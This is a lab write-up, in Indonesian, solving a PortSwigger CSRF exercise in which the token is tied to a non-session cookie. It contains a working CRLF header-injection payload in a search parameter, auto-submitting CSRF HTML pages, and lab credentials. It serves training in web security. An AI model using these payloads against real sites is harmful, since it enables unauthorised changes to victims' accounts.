# CSRF di Mana Token Terikat pada Cookie Non-Sesi

Fungsi perubahan email pada lab ini rentan terhadap serangan CSRF. Meskipun menggunakan token untuk mencoba mencegah serangan CSRF, token tersebut belum sepenuhnya terintegrasi ke dalam sistem penanganan sesi situs.

Untuk menyelesaikan lab ini, gunakan server eksploitasi Anda untuk meng-host halaman HTML yang menggunakan serangan CSRF untuk mengubah alamat email pengguna.

Anda memiliki dua akun di aplikasi yang dapat Anda gunakan untuk membantu merancang serangan Anda. Kredensialnya adalah sebagai berikut:

- **wiener:peter**
- **carlos:montoya**

**Hint:** Anda tidak dapat mendaftarkan alamat email yang sudah digunakan oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji eksploitasi Anda, pastikan Anda menggunakan alamat email yang berbeda untuk eksploitasi akhir yang Anda kirimkan kepada korban.

---------------------------------------------

**Referensi:**

- [Bypassing CSRF Token Validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [Set Cookie dan Get Cookie dengan JavaScript](https://stackoverflow.com/questions/14573223/set-cookie-and-get-cookie-with-javascript)
- [Menggunakan XMLHttpRequest untuk Mengatur Header Cookie](https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/active-server-pages/xmlhttprequest-setrequestheader-method-cookies)
- [Mengirim Data POST Menggunakan XMLHttpRequest](https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest)

![Gambar](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/1.png)

---------------------------------------------

Pertama, kita mengubah email menjadi `test@test.com` dan menemukan ada 2 cookie, satu adalah “session” dan yang lainnya adalah “csrfKey”:

![Gambar](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/2.png)

Kemudian saya menemukan beberapa kode untuk mengatur nilai cookie ([sumber](https://stackoverflow.com/questions/14573223/set-cookie-and-get-cookie-with-javascript)):

```javascript
function setCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

setCookie('ppkcookie', 'testcookie', 7);
```

Dalam kasus kita, kita akan mengubah baris terakhir menjadi:

```html
<html>
  <!-- CSRF PoC - dibuat oleh Burp Suite Professional -->
  <body>
  
		<script>
		function setCookie(name, value, days) {
			var expires = "";
			if (days) {
				var date = new Date();
				date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
				expires = "; expires=" + date.toUTCString();
			}
			document.cookie = name + "=" + (value || "") + expires + "; path=/";
		}

		setCookie('csrfKey', 'Eb67I1HyfMZGN1o9KZWih0EwODxdozMg', 7);
		</script>
	
    <form action="https://0a7900c3035d83b782ebb0de009400e0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="V99KDCadmiyH6AJ1jjXnlHyZxdfQtEkl" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Namun, ini tidak akan berhasil karena kita perlu mengatur header Cookie, bukan cookie di browser. Kita bisa menggunakan XHR ([sumber](https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/active-server-pages/xmlhttprequest-setrequestheader-method-cookies)). Kemudian saya akan membuat permintaan POST dalam JavaScript dengan XHR ([sumber](https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest)):

```html
<script>

var xhr = new XMLHttpRequest();
var url = "https://0a7900c3035d83b782ebb0de009400e0.web-security-academy.net";
xhr.open('POST', url + '/my-account/change-email', true);

xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('Cookie', 'TESTING');
xhr.setRequestHeader('Cookie', 'csrfKey=Eb67I1HyfMZGN1o9KZWih0EwODxdozMg');

xhr.onload = function () {
    // lakukan sesuatu dengan respons
    console.log(this.responseText);
};
xhr.send('email=test12&#64;test&#46;com&csrf=V99KDCadmiyH6AJ1jjXnlHyZxdfQtEkl');

</script>
```

Tetapi ini juga tidak berhasil.

Mengecek aplikasi lagi, kita menemukan fungsi pencarian menambahkan nilai di header HTTP Cookie:

![Gambar](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/3.png)

Nilai tersebut ditambahkan sebagai `LastSearchTerm`:

![Gambar](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/4.png)

Mengikuti solusi resmi, diperlukan untuk menggunakan payload ini:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

- `0x0A` adalah karakter newline `\n`
- `0x0D` adalah karakter return `\r`
- `Set-Cookie` akan mengubah nilai untuk header HTTP Cookie

Elemen `img` akan memuat URL berbahaya dan mengirimkan formulir yang dihasilkan oleh Burp:

```html
<html>
  <!-- CSRF PoC - dibuat oleh Burp Suite Professional -->
  <body>
	  <form action="https://0a3a0029035a2e108071588100890067.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test12&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="l0RRXoovjgxMasM34eeADEMkc24whrt3" />
      <input type="submit" value="Submit request" />
      </form>
      
      <img src='https://0a3a0029035a2e108071588100890067.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=tCFA5gCGZOqAwxhYizupPrZqP7jvVE8L%3b%20SameSite=None' onerror="document.forms[0].submit()" />

  </body>
</html>
```

![Gambar](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/5.png)

# Penjelasan Langkah demi Langkah

1. **Identifikasi Kerentanan CSRF:**
   - Fungsi perubahan email pada aplikasi rentan terhadap serangan CSRF karena token tidak sepenuhnya terintegrasi dengan sistem sesi.

2. **Menyiapkan Eksploitasi:**
   - Gunakan server eksploitasi untuk meng-host halaman HTML yang akan melakukan serangan CSRF.
   - Dua akun yang tersedia (`wiener:peter` dan `carlos:montoya`) dapat membantu dalam menguji dan merancang serangan.

3. **Mengubah Email dan Mengamati Cookie:**
   - Ubah email ke `test@test.com` dan perhatikan adanya dua cookie: `session` dan `csrfKey`.

4. **Mengatur Cookie dengan JavaScript:**
   - Gunakan fungsi `setCookie` untuk mengatur nilai cookie `csrfKey` agar sesuai dengan kebutuhan serangan.

5. **Membuat Formulir CSRF:**
   - Buat formulir yang mengirimkan permintaan POST ke endpoint perubahan email dengan nilai `email` dan `csrf` yang telah ditentukan.
   - Gunakan JavaScript untuk secara otomatis mengirimkan formulir tersebut.

6. **Mengatasi Pembatasan Header Cookie:**
   - Karena perlu mengatur header Cookie secara langsung, gunakan XMLHttpRequest (XHR) untuk membuat permintaan POST dengan header yang diperlukan.
   - Namun, pendekatan ini tidak berhasil karena keterbatasan dalam mengatur header Cookie melalui XHR.

7. **Memanfaatkan Fungsi Pencarian untuk Menyisipkan Header Cookie:**
   - Temukan bahwa fungsi pencarian menambahkan nilai ke header HTTP Cookie sebagai `LastSearchTerm`.
   - Gunakan payload khusus yang menyisipkan header `Set-Cookie` melalui parameter pencarian.

8. **Mengirimkan Payload Melalui Elemen `img`:**
   - Gunakan elemen `img` untuk memuat URL berbahaya yang menyisipkan header `Set-Cookie` baru.
   - Tambahkan atribut `onerror` untuk secara otomatis mengirimkan formulir CSRF ketika terjadi kesalahan dalam memuat gambar.

9. **Melakukan Serangan CSRF:**
   - Ketika korban mengunjungi halaman berbahaya, elemen `img` akan memuat URL yang menyisipkan cookie `csrfKey` baru dan kemudian secara otomatis mengirimkan formulir yang mengubah alamat email korban.

Dengan mengikuti langkah-langkah di atas, Anda dapat memanfaatkan kerentanan CSRF pada aplikasi untuk mengubah alamat email pengguna tanpa sepengetahuan mereka.

# Kesimpulan

Serangan CSRF yang mengikat token pada cookie non-sesi memerlukan pemahaman mendalam tentang bagaimana aplikasi menangani token dan cookie. Dengan memanfaatkan celah dalam penanganan header Cookie dan fungsi pencarian, penyerang dapat menyisipkan token CSRF yang valid dan melakukan tindakan tanpa izin pengguna.

Pastikan untuk selalu mengintegrasikan token CSRF secara penuh dengan sistem sesi dan menerapkan kebijakan keamanan tambahan seperti `SameSite` pada cookie untuk mencegah jenis serangan ini.

# Referensi

- [PortSwigger: Bypassing CSRF Token Validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [Stack Overflow: Set Cookie dan Get Cookie dengan JavaScript](https://stackoverflow.com/questions/14573223/set-cookie-and-get-cookie-with-javascript)
- [Microsoft Docs: XMLHttpRequest SetRequestHeader Method Cookies](https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/active-server-pages/xmlhttprequest-setrequestheader-method-cookies)
- [Stack Overflow: Send POST Data Using XMLHttpRequest](https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest)

# Gambar Ilustrasi

1. ![Gambar 1](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/1.png)
2. ![Gambar 2](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/2.png)
3. ![Gambar 3](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/3.png)
4. ![Gambar 4](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/4.png)
5. ![Gambar 5](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/5.png)
